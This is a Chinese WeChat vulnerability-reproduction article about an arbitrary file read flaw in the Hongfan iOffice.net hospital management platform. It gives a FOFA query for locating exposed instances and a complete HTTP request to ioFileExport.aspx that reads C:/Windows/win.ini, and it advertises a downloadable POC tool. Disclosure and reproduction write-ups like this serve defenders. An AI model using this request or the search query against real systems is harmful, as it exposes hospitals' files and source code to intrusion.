#  ​红帆iOffice 存在任意文件读取漏洞 附POC

原创 南风徐来 [ 南风漏洞复现文库 ](javascript:void\(0\);)

**南风漏洞复现文库** ![]()

微信号 gh_a9e9b8a80c70

功能介绍 分享各种CVE CNVD CNVD及最新漏洞信息、漏洞复现、漏洞利用工具、漏洞整改等内容，适合安全运维人员，网络安全方面的人交流学习。

____

___发表于_

收录于合集 #漏洞文库 81个

免责声明：请勿利用文章内的相关技术从事非法测试，由于传播、利用此文所提供的信息或者工具而造成的任何直接或者间接的后果及损失，均由使用者本人负责，所产生的一切不良后果与文章作者无关。该文章仅供学习用途使用。

## 1\. 红帆iOffice 简介

微信公众号搜索：南风漏洞复现文库 该文章 南风漏洞复现文库 公众号首发

红帆iOffice.net从最早满足医院行政办公需求（传统OA），到目前融合了卫生主管部门的管理规范和众多行业特色应用，是目前唯一定位于解决医院综合业务管理的软件。

## 2.漏洞描述

红帆iOffice.net从最早满足医院行政办公需求（传统OA），到目前融合了卫生主管部门的管理规范和众多行业特色应用，是目前唯一定位于解决医院综合业务管理的软件，是最符合医院行业特点的医院综合业务管理平台，是成功案例最多的医院综合业务管理软件。红帆iOffice.net
ioFileExport.aspx处存在任意文件读取，攻击者可以从其中获取网站路径和源码等敏感信息进一步攻击。

CVE编号:

CNNVD编号:

CNVD编号:

## 3.影响版本

红帆iOffice.net信息管理平台信息化平台

![]()红帆iOffice 存在任意文件读取漏洞

## 4.fofa查询语句

(app="红帆-ioffice" || app="红帆-HFOffice")

## 5.漏洞复现

漏洞链接：http://127.0.0.1/iOffice/prg/set/ioCom/ioFileExport.aspx?url=C:/Windows/win.ini

漏洞数据包：

    
    
    GET /iOffice/prg/set/ioCom/ioFileExport.aspx?url=C:/Windows/win.ini HTTP/1.1  
    Host: 127.0.0.1  
    User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1)  
    Accept: */*  
    Connection: Keep-Alive

读取C:/Windows/win.ini 文件

![]()

读取配置文件

![]()

## 6.POC&EXP

关注公众号 南风漏洞复现文库 并回复 漏洞复现64 即可获得该POC工具下载地址：

![]()

本期漏洞及往期漏洞的批量扫描POC及POC工具箱已经上传知识星球：南风网络安全

![]()![]()![]()

## 7.整改意见

联系厂商更新补丁：https://www.ioffice.cn/

## 8.往期回顾

[NUUO摄像头存在远程命令执行漏洞
附POC](http://mp.weixin.qq.com/s?__biz=MzIxMjEzMDkyMA==&mid=2247484361&idx=1&sn=f9a86578f3ab88b58a81080411664e55&chksm=974b8ecea03c07d879ed85f61c9a2bfefc2e61f3a05d4534e5a94568eb89522821b3a34cf552&scene=21#wechat_redirect)  

[用友U8-Cloud 存在任意文件上传漏洞
附POC](http://mp.weixin.qq.com/s?__biz=MzIxMjEzMDkyMA==&mid=2247484349&idx=1&sn=6e04a731795ea303a089509978ea747a&chksm=974b8ebaa03c07ac0fba339a9d349139bc68755e7cd666e10a0a865b19487344e09da98da41f&scene=21#wechat_redirect)  

  

预览时标签不可点

微信扫一扫  
关注该公众号

[知道了](javascript:;)

微信扫一扫  
使用小程序

****

[取消](javascript:void\(0\);) [允许](javascript:void\(0\);)

****

[取消](javascript:void\(0\);) [允许](javascript:void\(0\);)

： ， 。   视频 小程序 赞 ，轻点两下取消赞 在看 ，轻点两下取消在看

